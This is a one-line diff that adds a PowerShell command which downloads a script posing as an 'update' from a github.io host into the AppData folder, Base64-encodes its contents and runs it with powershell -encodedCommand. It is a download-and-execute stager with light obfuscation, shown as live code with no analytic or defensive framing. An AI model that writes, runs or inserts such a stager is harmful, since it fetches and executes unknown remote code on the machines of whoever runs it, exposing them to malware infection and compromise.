@@ -1,0 +1,1 @@
+Invoke-webrequest -URI https://hakkyahud.github.io/updates_Kb64u0saka.ps1 -o $env:appdata\updates_Kb64u0saka.ps1;$k3cKu75=[System.Text.Encoding]::Unicode.GetBytes($(Get-Content $env:appdata\updates_Kb64u0saka.ps1));powershell -encodedCommand $([Convert]::ToBase64String($k3cKu75))
